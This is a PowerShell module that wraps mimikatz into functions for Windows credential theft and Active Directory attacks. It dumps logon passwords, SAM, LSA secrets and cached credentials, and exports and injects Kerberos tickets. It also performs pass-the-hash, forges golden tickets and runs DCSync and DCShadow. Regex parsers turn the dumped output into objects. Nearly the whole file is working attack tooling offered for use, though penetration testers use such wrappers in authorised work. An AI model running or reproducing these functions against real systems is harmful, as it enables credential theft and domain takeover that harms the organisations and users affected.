

function Get-MKLogonPassword {
    mimikatz.exe privilege::debug sekurlsa::logonpasswords exit 
}

function Get-MKTicket {
    param(
        [Parameter()]
        [Switch]$Export
    )

    $ExportSwitch = ""
    if ($Export) {
        $ExportSwitch = " /export"
    }

    mimikatz.exe privilege::debug "sekurlsa::tickets$ExportSwitch" exit
}

function Invoke-MKPassTheHash {
    param(
        [Parameter(Mandatory)] 
        [string]$User,
        [Parameter(Mandatory)]
        [string]$Domain,
        [Parameter(Mandatory)]
        [string]$NtlmHash,
        [Parameter()]
        [string]$Command = 'powershell'    
        )

    mimikatz.exe privilege::debug "sekurlsa::pth /user:$User /domain:$Domain /ntlm:$NtlmHash /run:$Command" exit
}

function Get-MKKerberosTicket {
    param(
        [Parameter()]
        [Switch]$Export
    )

    $ExportSwitch = ""
    if ($Export) {
        $ExportSwitch = " /export"
    }

    mimikatz.exe privilege::debug "kerberos::list$ExportSwitch" exit
}

function Export-MKKerberosTicket {
    param(
        [Parameter(Mandatory)]
        [string]$FilePath
    )

    mimikatz.exe privilege::debug "kerberos::ptt $FilePath" exit
}

function Grant-MKKerberosGoldenTicket {
    param(
        [Parameter(Mandatory)]
        [string]$Administrator,
        [Parameter(Mandatory)]
        [string]$Domain,
        [Parameter(Mandatory)]
        [string]$Sid,
        [Parameter(Mandatory)]
        [string]$KrbtgtNtlmHash,
        [Parameter(Mandatory)]
        [string]$TicketPath
    )

    if (-not (Test-Path $TicketPath)) {
        throw "Could not find ticket '$TicketPath'"
    }

    mimikatz.exe privilege::debug "kerberos::golden /admin:$Administrator /domain:$Domain /sid:$Sid /krbtgt:$KrbtgtNtlmHash /ticket:$TicketPath" exit
}

function Get-MKCredentialVaultCredential {
    mimikatz.exe privilege::debug token::elevate vault::cred exit
}

function Get-MKCredentialVault {
    mimikatz.exe privilege::debug token::elevate vault::list exit
}

function Get-MKLsaSam {
    mimikatz.exe privilege::debug token::elevate lsadump::sam exit
}

function Get-MKLsaSecret {
    mimikatz.exe privilege::debug token::elevate lsadump::secrets exit
}

function Get-MKLsaCache {
    mimikatz.exe privilege::debug token::elevate lsadump::cache exit
}

function Invoke-MKDcSync {
    param(
        [Parameter(Mandatory)]
        [string]$UserName,
        [Parameter(Mandatory)]
        [string]$Domain
    )

    mimikatz.exe privilege::debug token::elevate "lsadump::dcsync /user:$UserName /domain:$Domain" exit
}

function Invoke-MKDcShadow {
    param(
        [Parameter(Mandatory, ParameterSetName = 'push')]   
        [Switch]$Push,
        [Parameter(ParameterSetName = 'rpc')]   
        [string]$Domain = (Get-ADDomain | Select-Object -ExpandProperty Name),
        [Parameter(Mandatory, ParameterSetName = 'rpc')]   
        [string]$Object,
        [Parameter(Mandatory, ParameterSetName = 'rpc')]   
        [string]$Attribute,
        [Parameter(Mandatory, ParameterSetName = 'rpc')]   
        [string]$Value
    )

    Begin {
        if ($PSCmdlet.ParameterSetName -eq 'push') {
            mimikatz.exe privilege::debug "lsadump::dcshadow /push" exit
        }
        else {

            $PushJob = Start-Job  {
                Start-Sleep 5

                mimikatz.exe lsadump::dcshadow "/push exit"

                Start-Sleep  5

                Get-Process mimikatz | Stop-Process
            }

            mimikatz.exe privilege::debug "lsadump::dcshadow /object:$Object /attribute:$attribute /value:$Value /domain:$Domain"

            $PushJob | Wait-Job | Out-Null
        }
    }
}

function ConvertTo-Object {
    param(
      [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
      [string[]]$InputString,
  
      [Parameter(Mandatory=$true,ValueFromRemainingArguments=$true)]
      [string]$Pattern
    )
  
    process{
      foreach($string in $InputString){
  
        $Matches = [System.Text.RegularExpressions.RegEx]::Matches($InputString, $Pattern)
        foreach($match in $matches) {
          $Properties = $match.Groups | Select-Object -Skip 1 | ForEach-Object -Begin {$t = @{}} -Process {$t[$_.Name] = $_.Value} -End {$t}
          [PSCustomObject]$Properties
        }
      }
    }
  }
  
  
  
  function ConvertFrom-MKOutput {
      param(
          [Parameter(ValueFromPipeline)]
          [string]$Output,
          [Parameter(Mandatory)]
          [ValidateSet("LogonPasswords", "VaultCred", "VaultList", "LsadumpSam")]
          [string]$OutputType
      )

      
      Process {

      switch($OutputType) {
              "LogonPasswords" { $RegEx = '(?:Authentication Id\s+:\s(?<AuthenticationId>.*))[\s\S]*?(?:Session\s+:\s(?<Session>.*))[\s\S]*?(?:User Name\s+:\s(?<UserName>.*))\r*\s*(?:Domain\s+:\s(?<Domain>.*))\r*\s*(?:Logon Server\s+:\s(?<LogonServer>.*))\r*\s*(?:Logon Time\s+:\s(?<LogonTime>.*))\r*\s*(?:SID\s+:\s(?<SID>.*))[\s\S]*?(?:NTLM\s*:\s(?<NTLMHash>.*))?[\s\S]*?(?:SHA1?\s*:\s(?<SHA1Hash>.*))?[\s\S]*?(?:Password\s*:\s(?<Password>.*))'}
              "VaultCred" { $RegEx = '(?:TargetName\s+:\s(?<TargetName>.*))[\s\S]*(?:UserName\s+:\s(?<UserName>.*))[\s\S]*(?:Comment\s+:\s(?<Comment>.*))[\s\S]*(?:Type\s+:\s(?<Type>.*))[\s\S]*(?:Persist\s+:\s(?<Persist>.*))[\s\S]*(?:Flags\s+:\s(?<Flags>.*))[\s\S]*(?:Credential\s+:\s(?<Credential>.*))[\s\S]*(?:Attributes\s+:\s(?<Attributes>.*))'}
              "VaultList" { $RegEx = '(?:Vault\s+:\s(?<Vault>.*))[\s\S]*?(?:\s+Name\s+:\s(?<Name>.*))[\s\S]*?(?:\s+Path\s+:\s(?<Path>.*))' }
              "LsadumpSam" {$RegEx = '(?:Domain\s+:\s(?<Domain>.*))[\s\S]*(?:SysKey\s+:\s(?<SysKey>.*))[\s\S]*(?:Local SID\s+:\s(?<LocalSID>.*))[\s\S]*(?:SAMKey\s+:\s(?<SAMKey>.*))'} 
          }

          $Output.ToString() | ConvertTo-Object -Pattern $RegEx

      }
  }
  
  